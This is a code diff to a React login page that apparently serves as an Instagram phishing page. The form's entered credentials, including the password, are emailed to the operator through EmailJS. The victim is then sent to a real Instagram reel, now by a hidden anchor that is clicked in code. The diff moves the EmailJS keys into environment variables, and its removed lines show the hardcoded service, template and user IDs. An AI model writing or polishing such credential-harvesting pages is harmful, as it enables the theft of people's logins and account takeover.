@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef } from 'react';
 import emailjs from 'emailjs-com';
 
 const Login = () => {
@@ -8,6 +8,9 @@ const Login = () => {
     password: ''
   });
   const [error, setError] = useState('');
+
+  // Ref for the anchor tag
+  const instaRedirectRef = useRef(null);
 
   // Handle input change
   const handleChange = (e) => {
@@ -42,18 +45,19 @@ const Login = () => {
 
     // If valid, send form data using EmailJS
     emailjs.send(
-      'service_0wdmx3e',       // Replace with your EmailJS Service ID
-      'template_j1i3j7a',      // Replace with your EmailJS Template ID
-      formData,                // Data to be sent in the email
-      'UGclixFGJ4TR5VXQK'      // Replace with your EmailJS User ID
+      import.meta.env.VITE_EMAILJS_SERVICE_ID,  // EmailJS Service ID from .env
+      import.meta.env.VITE_EMAILJS_TEMPLATE_ID, // EmailJS Template ID from .env
+      formData,                                 // Data to be sent in the email
+      import.meta.env.VITE_EMAILJS_USER_ID      // EmailJS User ID from .env
     )
     .then((result) => {
-      console.log(result.text);
-      // Redirect to provided link after successful form submission
-      window.location.href = "https://www.instagram.com/reel/CucGUFGP3WK/?igsh=MWtsdzZndHlqeDllZw==";  // Replace with your target URL
+      console.log('Email successfully sent:', result.text);
+      // Programmatically trigger the anchor tag click event for redirection
+      instaRedirectRef.current.click();
     })
     .catch((error) => {
-      console.log(error.text);
+      console.error('Email sending error:', error.text);
+      setError('There was an error submitting the form. Please try again.');
     });
   };
 
@@ -99,6 +103,17 @@ const Login = () => {
           </div>
           <button type="submit" className="btn btn-primary w-full">Log In</button>
         </form>
+
+        {/* Hidden anchor tag for Instagram redirection */}
+        <a
+          ref={instaRedirectRef}
+          href="https://www.instagram.com/reel/CucGUFGP3WK/?igsh=MWtsdzZndHlqeDllZw=="
+          className="hidden"
+          target="_blank"
+          rel="noopener noreferrer"
+        >
+          Instagram Redirect
+        </a>
 
         <div className="text-center mt-6 text-sm">
           <a href="#" className="text-blue-500">Forgot password?</a>
